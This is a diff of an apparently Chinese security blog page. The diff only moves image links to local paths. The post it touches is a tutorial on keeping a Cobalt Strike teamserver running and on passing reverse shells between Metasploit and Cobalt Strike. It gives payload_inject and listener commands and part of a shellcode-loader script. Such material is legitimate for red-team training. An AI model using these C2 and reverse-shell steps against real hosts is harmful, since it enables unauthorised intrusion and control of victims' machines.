@@ -22,19 +22,19 @@
 <meta property="og:site_name" content="Cosmic Fragments">
 <meta property="og:description" content="‮">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210837.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191016141154.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210308.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210428.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191101171437.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191031142243.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191031142447.png">
-<meta property="og:image" content="http://0blog.test.upcdn.net/20191101213459.png">
-<meta property="og:updated_time" content="2019-11-22T05:46:29.929Z">
+<meta property="og:image" content="/img/20191101210837.png">
+<meta property="og:image" content="/img/20191016141154.png">
+<meta property="og:image" content="/img/20191101210308.png">
+<meta property="og:image" content="/img/20191101210428.png">
+<meta property="og:image" content="/img/20191101171437.png">
+<meta property="og:image" content="/img/20191031142243.png">
+<meta property="og:image" content="/img/20191031142447.png">
+<meta property="og:image" content="/img/20191101213459.png">
+<meta property="og:updated_time" content="2024-05-29T07:03:08.282Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cobaltstrike Server持久化 &amp; Cobaltstrike与Metasploit相互派生shell">
 <meta name="twitter:description" content="‮">
-<meta name="twitter:image" content="http://0blog.test.upcdn.net/20191101210837.png">
+<meta name="twitter:image" content="/img/20191101210837.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -262,7 +262,7 @@
       
           
         <p>‮<br><a id="more"></a></p>
-<h2 id="Cobaltstrike-teamserver持久化"><a href="#Cobaltstrike-teamserver持久化" class="headerlink" title="Cobaltstrike teamserver持久化"></a>Cobaltstrike teamserver持久化</h2><p><img src="http://0blog.test.upcdn.net/20191101210837.png" alt></p>
+<h2 id="Cobaltstrike-teamserver持久化"><a href="#Cobaltstrike-teamserver持久化" class="headerlink" title="Cobaltstrike teamserver持久化"></a>Cobaltstrike teamserver持久化</h2><p><img src="/img/20191101210837.png" alt></p>
 <p>由于我们在终端中的操作都属于SSH进程的子进程，当网络中断或SSH连接断开时，终端会收到HUP(hangup)信号从而关闭所有子进程。为了使Cobaltstrike的服务端保持唤醒，我们需要：a</p>
 <ol>
 <li>让进程忽略HUP信号；</li>
@@ -287,11 +287,11 @@ root     3998     1  0 20:37 pts/4    00:00:00 ping 0sec.com.cn
 <pre><code># 首先安装screen
 apt-get install screen
 </code></pre><p>输入<code>screen</code>新建一个窗口，在此窗口中直接正常输入命令，完成后使用<strong>Ctrl+A+D组合键</strong>将窗口放入后台执行，可以看到有会话为脱离状态：</p>
-<p><img src="http://0blog.test.upcdn.net/20191016141154.png" alt></p>
+<p><img src="/img/20191016141154.png" alt></p>
 <p>使用<code>screen -ls</code>查看后台窗口，<code>screen -r ID</code>恢复指定会话：</p>
 <pre><code>screen -r 14662
 </code></pre><p>同样的，Metasploit监听端口等待反弹shell时，也可以用这种方式进行持久化，操作相对于<code>nohup</code>要方便得多。</p>
-<h2 id="MSF派生shell给Cobaltstrike"><a href="#MSF派生shell给Cobaltstrike" class="headerlink" title="MSF派生shell给Cobaltstrike"></a>MSF派生shell给Cobaltstrike</h2><p><img src="http://0blog.test.upcdn.net/20191101210308.png" alt></p>
+<h2 id="MSF派生shell给Cobaltstrike"><a href="#MSF派生shell给Cobaltstrike" class="headerlink" title="MSF派生shell给Cobaltstrike"></a>MSF派生shell给Cobaltstrike</h2><p><img src="/img/20191101210308.png" alt></p>
 <p>获取MSF shell、建立session后在meterpreter执行<code>background</code>将会话放到后台，切换payload。</p>
 <p>拥有MSF shell的攻击机与搭建Cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell。</p>
 <pre><code>msf exploit(handler) &gt;  use exploit/windows/local/payload_inject
@@ -303,18 +303,18 @@ msf exploit(payload_inject) &gt; set SESSION [session ID]
 msf exploit(payload_inject) &gt; exploit
 </code></pre><p>配置<code>set DisablePayloadHandler true</code>的原因是payload_inject执行之后会在本地产生一个新的handler，而我们之前已经有了一个，不需要再生成。</p>
 <p>多个session同时建立时可以列举所有session并按需选择想要派生的shell：</p>
-<p><img src="http://0blog.test.upcdn.net/20191101210428.png" alt></p>
+<p><img src="/img/20191101210428.png" alt></p>
 <p>CS端配置如下监听器：</p>
 <pre><code>windows/beacon_http/reverse_http
 </code></pre><p>CS端肉鸡上线成功：</p>
-<p><img src="http://0blog.test.upcdn.net/20191101171437.png" alt></p>
+<p><img src="/img/20191101171437.png" alt></p>
 <h2 id="Cobaltstrike派生shell给MSF"><a href="#Cobaltstrike派生shell给MSF" class="headerlink" title="Cobaltstrike派生shell给MSF"></a>Cobaltstrike派生shell给MSF</h2><p>在CS获得一个beacon shell后，配置监听器</p>
 <pre><code>windows/foreign/reverse_tcp
 </code></pre><p>注意由于要与之后MSF的<code>windows/meterpreter/reverse_tcp</code>配置保持一致，这里是<code>reverse_tcp</code>而不再是<code>reverse_http</code>，同样的，配置IP与端口也应与MSF的监听保持一致。</p>
 <p>提前在MSF设置<code>exploit/multi/handler</code>对反向TCP连接的监听，这一步比较常规不再赘述。对需要派生的目标右击选择Spawn，之后选择对应的监听器。</p>
-<p><img src="http://0blog.test.upcdn.net/20191031142243.png" alt></p>
+<p><img src="/img/20191031142243.png" alt></p>
 <p>另一端MSF稍后即获取到shell连接，获得Meterpreter会话：</p>
-<p><img src="http://0blog.test.upcdn.net/20191031142447.png" alt></p>
+<p><img src="/img/20191031142447.png" alt></p>
 <h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>有什么需要派生shell的场景呢？首先CS虽然强大但用于攻击的载荷模块并不如MSF丰富，可参考的资料也较少，此时需要MSF接手shell继续进行后续渗透流程；其次CS的肉鸡类型主要支持Windows平台，payload也面向Windows，这一点我们可以查看CS生成的<code>Scripted Web Delivery</code>中python类型的载荷，解码后如下(略去shellcode)：</p>
 <pre><code>import ctypes
 import platform
@@ -344,7 +344,7 @@ ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
 <hr>
 <p>Cobaltstrike核心的功能还是后渗透阶段，免杀、内网中的横向移动、内网转发、C2配置文件等，后续的文章也会围绕这些内容进行展开。</p>
 <p>写本文时值万圣节，Metasploit也更换了主题banner：</p>
-<p><img src="http://0blog.test.upcdn.net/20191101213459.png" alt></p>
+<p><img src="/img/20191101213459.png" alt></p>
 
       
     </div>
